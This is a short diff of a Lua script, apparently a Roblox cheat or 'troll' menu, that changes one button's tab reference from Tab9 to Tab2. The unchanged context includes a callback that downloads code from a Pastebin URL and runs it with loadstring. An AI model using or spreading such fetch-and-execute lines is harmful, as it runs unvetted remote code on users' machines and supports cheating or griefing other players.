@@ -364,7 +364,7 @@ local Tab2 = Window:MakeTab({"Troll", "rbxassetid://10734934585"})
 
 local Section = Tab2:AddSection({"Aba Troll"})
 
-Tab9:AddButton({
+Tab2:AddButton({
   Name = "Dark Blade(Antecipado)",
   Callback = function()
     loadstring(game:HttpGet('https://pastebin.com/raw/6ctYevGX'))()
